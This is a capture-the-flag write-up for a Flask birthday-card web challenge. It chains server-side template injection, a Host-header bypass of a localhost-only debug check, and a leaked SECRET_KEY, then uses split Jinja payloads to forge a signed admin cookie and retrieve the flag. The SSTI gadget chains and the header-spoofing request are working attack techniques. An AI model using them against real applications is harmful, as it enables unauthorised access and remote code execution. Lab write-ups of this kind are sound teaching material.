# Birthday Card Generator - CTF Challenge Writeup

## Challenge Description

This challenge presents a web application that generates personalized birthday cards. At first glance, it seems like a simple application, but it contains multiple vulnerabilities that we need to chain together to capture the flag. The application is built using Flask, a Python web framework.

## Overview of the Application

The application has several key features:
1. User registration and login system
2. Birthday card generator(with maxlength restrictions)
3. Debug endpoints (supposedly for development)
4. An admin report page containing the flag

## Vulnerability Analysis

Let's break down the main vulnerabilities we find in this application:

1. Server-Side Template Injection (SSTI) in the card generator
2. Information disclosure through debug endpoints
3. Weak access control for debug endpoints
4. Authentication bypass potential in the admin report endpoint

## Step-by-Step Exploitation

### Step 1: Initial Reconnaissance

First, let's explore the application's endpoints:

1. `/` - Birthday card generator
2. `/debug/test` - Debug endpoints
3. `/admin/report` - Admin page containing the flag

Let's start by creating an account:

```http
POST /register
Content-Type: application/x-www-form-urlencoded

username=hacker&password=test123
```

### Step 2: Discovering the SSTI Vulnerability

The card generator endpoint `/` takes a recipient's name and displays it in a template. Looking at the code:

```python
template = f"""
    <link rel="stylesheet" href="static/style.css">
    <h1>Your Personalized Card</h1>
    <div class="card">
        <h2>From: {sender}</h2>
        <h2>To: {recipient}</h2>
        <p>{message}</p>
        <h1>{final_message}</h1>
    </div>
    <br>
    <a href="/">Create Another Card</a>
            """
return render_template_string(template)
```

This is vulnerable to Server-Side Template Injection because it uses `render_template_string()` with user input.

To test for SSTI, we can try:
```
Recipient: {{7*7}}
```

If you see `49` in the output instead of `{{7*7}}`, we've confirmed the SSTI vulnerability!

### Step 3: Exploiting Debug Endpoints

The interesting part about the debug endpoints is this check:
```python
if host != "localhost:3030":
    return "Access restricted to localhost:3030"
```

We can bypass this by adding a custom Host header:
```http
POST /debug/test
Host: localhost:3030
```

The logs contain the `SECRET_KEY` which we'll need to confirm that whether its the same key shown in the config!

```{{config}}```
should show us the SECRET_KEY as well

### Step 4: Advanced SSTI Exploitation

Now that we've confirmed SSTI, we can use more advanced payloads.The problem here is, if we try use the inbuilt functions it wont work in jinja by default, but we can see that builtin functions made global using the _TemplateSecurityManager class.


Now payloads can:
1. Accesses Flask's request object
2. Gets to Python's built-in functions
3. Imports the 'os' module
4. Executes commands

### Step 5: Getting the Admin Cookie

Looking at the `/admin/report` endpoint:
```python
token, signature = auth_cookie.rsplit(".", 1)
from signer import init_signer
signer = init_signer(SECRET_KEY)
sign_token_function = signer.get_signer_function()
valid_signature = sign_token_function(token)
```

We need to:
1. Create a token with value "admin"
2. Import the class init_signer from the signer module dynamically in the runtime
3. Sign it with the SECRET_KEY we found using the sign_token_function
4. Combine them as `admin.<signature>`

Using SSTI, we can craft a payload to sign our token by accessing the builtin function from validator:

first we need to find the index of the validator class as they have the builtins module, which is used to import the modules outside

```
''.__class__.__mro__[1].__subclasses__()
```
Once we got the index proceed to craft the payload to sign our token.
```
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].security().__import__('signer').init_signer('super_secret_key').get_signer_function()('admin') }}
```
But the problem here is we can't our payload length more than 50.
so we have to break our payload and use all the inputs to connect each payloads one and other, and finally sign the token

```
sender : {%set a=''.__class__.__mro__[1].__subclasses__()%}
recipient : {%set b=a[-1].security().__import__%}
message : {%set c=b('app.sign',{},{}, ['initFn']).initFn%}
final_message : {{c(config.SECRET_KEY).get_signer()('admin')}}
```

### Step 5: Getting the Flag

With our signed admin token, we can make the final request:

```http
GET /admin/report
Cookie: session=admin.<signature_from_step_4>
```

And we get our flag: `p_ctf{S3rVer_STI_G0es_hArd}`

## Tools Used
- Web browser
- Burp Suite or similar proxy (for manipulating requests)
- Python (for crafting payloads)